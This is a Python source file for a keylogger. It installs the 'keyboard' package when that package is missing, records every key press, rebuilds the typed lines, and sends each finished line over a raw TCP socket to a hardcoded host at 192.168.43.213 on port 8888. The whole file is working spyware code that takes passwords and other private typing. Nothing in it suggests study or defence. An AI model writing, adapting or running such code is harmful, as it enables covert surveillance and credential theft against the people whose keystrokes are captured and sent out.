from os import *
from sys import *
import socket

chars=[]
words = []
unused_chars = ['left', 'right', 'down', 'up','caps lock']

try:
    import keyboard
except ImportError:
    system("pip3 install keyboard")

def ctrl_delete(chars):
    index = 0
    while index < len(chars):
        print("chars is : "+str(chars))
        if chars[index] == "ctrl" and (len(chars)>index+2) :

            if (chars[index+1] == "shift" or chars[index+1] == "alt" or chars[index+1] == "tab" or chars[index+1] == "windows" or chars[index+1] == 'caps lock') :
                chars.pop(index)
                chars.pop(index)
                if len(chars) !=0: #if the list ended in alt char
                    chars.pop(index)
                else:
                    pass
            else:
                chars.pop(index)
                chars.pop(index)

        elif chars[index] == "shift" and (len(chars)>index+1):
            if chars[index+1] == "shift" or chars[index+1] == "alt" or chars[index+1] == "tab" or chars[index+1] == "windows" or chars[index+1] == 'caps lock':
                chars.pop(index)
                chars.pop(index)
            else:
                chars.pop(index)
                chars.pop(index)

        elif chars[index] == "alt" and (len(chars)>index+1):
            if chars[index+1] == "shift" or chars[index+1] == "alt" or chars[index+1] == "tab" or chars[index+1] == "windows" or chars[index+1] == 'caps lock':
                chars.pop(index)
                chars.pop(index)
            else:
                chars.pop(index)
        elif chars[index] == "windows" and (len(chars)>index+1): #named "left windows" in mac on vm
            if chars[index+1] == "shift" or chars[index+1] == "alt" or chars[index+1] == "tab" or chars[index+1] == "windows" or chars[index+1] == 'caps lock':
                chars.pop(index)
                chars.pop(index)
            else:
                chars.pop(index)
                try:
                    chars.pop(index) #if it is the last item in the list
                except:
                    pass

        elif chars[index] == "tab" and (len(chars)>index+1):
            if chars[index+1] == "shift" or chars[index+1] == "alt" or chars[index+1] == "tab" or chars[index+1] == "windows" or chars[index+1] == 'caps lock':
                chars.pop(index)
                chars.pop(index)
            else:
                chars.pop(index)
        elif chars[index] == 'backspace':
            if index == 0:
                chars.pop(0)
            else:
                chars.pop(index)
                chars.pop(index-1)
        elif chars[index] == "space":
            chars[index] = " "
        else:
            index += 1

    for unused_char in unused_chars:
        for i in range(1000000000):
            try:
                chars.remove(unused_char)
            except:
                break
    return chars
def enter_interpreting(arr):
    for char in arr:
        if char == "enter" and arr.index("enter") !=0:
                mod1 = ''.join(arr[:arr.index("enter")])
                words.append(mod1)
                for i in range(arr.index("enter")):
                    arr.pop(0)
                arr.pop(arr.index("enter"))
                enter_interpreting(arr)
        elif char == "enter" and arr.index("enter") == 0:
            arr.pop(0)
            enter_interpreting(arr)
    return arr
def init_connection():
    HOST = "192.168.43.213"
    PORT = 8888
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
def send(msg):
    s.sendall(msg.encode())

def main():
    init_connection()
    def on_key_press(event):
        char = event.name
        chars.append(char)
        enter_interpreting(ctrl_delete(chars))
        if len(words) > 0:
            send(words[0])
            words.pop(0)
        else:
            pass
    keyboard.on_press(on_key_press)
    keyboard.wait()
if __name__=="__main__":
    main()